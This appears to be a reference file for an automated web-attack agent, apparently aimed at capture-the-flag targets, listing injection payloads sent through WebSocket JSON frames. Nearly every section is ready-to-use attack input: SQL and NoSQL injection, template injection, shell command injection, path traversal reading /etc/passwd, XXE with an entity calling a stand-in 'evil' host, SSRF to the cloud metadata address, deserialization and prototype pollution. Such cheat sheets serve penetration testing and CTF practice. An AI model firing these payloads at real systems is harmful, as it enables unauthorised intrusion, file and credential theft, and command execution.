# Injection in frames (deep) — every sink a field can reach

## SQL injection — the `q`/`filter`/`id`/`where`/`order` fields

```json
{"action":"search","q":"x' OR '1'='1--"}
{"action":"search","q":"x' UNION SELECT flag,2,3--"}
{"action":"read","id":"1 OR 1=1"}
{"action":"filter","where":"name='x' AND (SELECT SLEEP(2))--"}
{"action":"sort","order":"name,(CASE WHEN 1=1 THEN id ELSE name END)"}
{"action":"get","id":"admin' OR SLEEP(2)--"}
```

Boolean (`' AND '1'='1` vs `' AND '1'='2`), UNION (`' UNION SELECT ...`),
time (`SLEEP(2)`/`pg_sleep`), error (`'`/`'`)) — the `web-sqli` oracle
over the frame reply; the reply carries the extracted rows.

## NoSQL/operator injection — the object fields

```json
{"action":"login","user":"admin","pass":{"$ne":null}}
{"action":"find","q":{"$where":"return true"}}
{"action":"read","id":{"$gt":""}}
{"action":"find","q":{"$regex":"^admin"}}
{"action":"x","obj":{"$or":[{"_id":"a"},{"_id":"b"}]}}
```

`$ne`/`$gt`/`$where`/`$regex`/`$or`/`$and`/`$in`/`$exists` — a JSON
operator-object in a field reaching a document query → `web-nosqli`.

## SSTI — the rendered fields

```json
{"action":"greet","name":"{{7*7}}"}
{"action":"render","tpl":"${7*7}"}
{"action":"send","msg":"<%= 7*7 %>"}
{"action":"notify","text":"{{config.FLAG}}"}
{"action":"x","tpl":"{{''.__class__.mro()}}"}
```

`{{}}`/`${}`/`<%=`/`#{}`/`[[${}]]`/`@()`/`%{...}` — a rendered field →
`web-ssti`. The `{{7*7}}`→`49` marker confirms the engine.

## Command injection — the `host`/`file`/`cmd`/`input` fields

```json
{"action":"ping","host":"x;id"}
{"action":"exec","cmd":"id"}
{"action":"convert","file":"x|id"}
{"action":"dns","domain":"x$(id)"}
{"action":"render","input":"x`id`"}
{"action":"scan","target":"x%0aid"}
```

`;`|`|`/`&&`/`||`/`$()`/`` ` ``/`%0a`/newline — a field reaching a
shell → `web-command-injection`. The reply carries the output or a
blind-exfil via a callback.

## Path traversal / LFI — the `file`/`path`/`doc`/`name` fields

```json
{"action":"read","file":"../../etc/passwd"}
{"action":"load","path":"/flag"}
{"action":"attachment","name":"../../../etc/passwd"}
{"action":"export","doc":"file:///flag"}
{"action":"template","name":"../../secret"}
{"action":"download","file":"..\\..\\flag.txt"}
```

`../`/`..%2f`/`..\\`/`%2e%2e`/`....//`/`/..//`/`file://` —
`file-read-primitives`. The reply carries the file or an error.

## XXE — the `xml`/`data`/`import`/`parse` fields

```json
{"action":"parse","xml":"<?xml version='1.0'?><!DOCTYPE r[<!ENTITY x SYSTEM 'file:///flag'>]><r>&x;</r>"}
{"action":"import","xml":"<!DOCTYPE r[<!ENTITY x SYSTEM 'http://evil/x'>]><r>&x;</r>"}
{"action":"process","svg":"<svg><!DOCTYPE s[<!ENTITY x SYSTEM 'file:///flag'>]><s>&x;</s></svg>"}
```

A `DOCTYPE`/`ENTITY`/`SYSTEM` in an XML field → `web-xxe`; an `http://`
entity → `web-ssrf` too.

## Deserialization — the object/data fields

```json
{"action":"import","data":"O:8:\"stdClass\":1:{s:1:\"x\";s:3:\"y\";}"}
{"action":"load","obj":"rO0..."}
{"action":"session","data":"<pickle|yaml|java-ser|php-ser>"}
```

A serialized-object/base64 field → `web-deserialization`; a binary frame
that is a serialized object → the same.

## Prototype pollution — the `__proto__`/`constructor` fields

```json
{"action":"merge","obj":{"__proto__":{"isAdmin":true}}}
{"action":"set","key":"__proto__.role","value":"admin"}
{"action":"config","__proto__":{"role":"admin"}}
{"action":"x","constructor":{"prototype":{"x":1}}}
```

A `__proto__`/`constructor`/`prototype` key reaching a merge/assign →
`web-prototype-pollution`.

## SSRF — the `url`/`fetch`/`webhook`/`callback` fields

```json
{"action":"fetch","url":"http://169.254.169.254/latest/meta-data/"}
{"action":"webhook","url":"http://internal/admin"}
{"action":"import","url":"file:///flag"}
{"action":"ping","url":"http://localhost:6379/"}
```

A `url`/`fetch`/`webhook`/`callback`/`image`/`import` field reaching a
server-side fetch → `web-ssrf`.

## The injection-record

`oracle: message:<field>:<payload-class>:<the-evaluation-or-read>` —
the frame carries the payload; record the transport (WS) + the payload
class; route the exploit to the payload's depth skill.
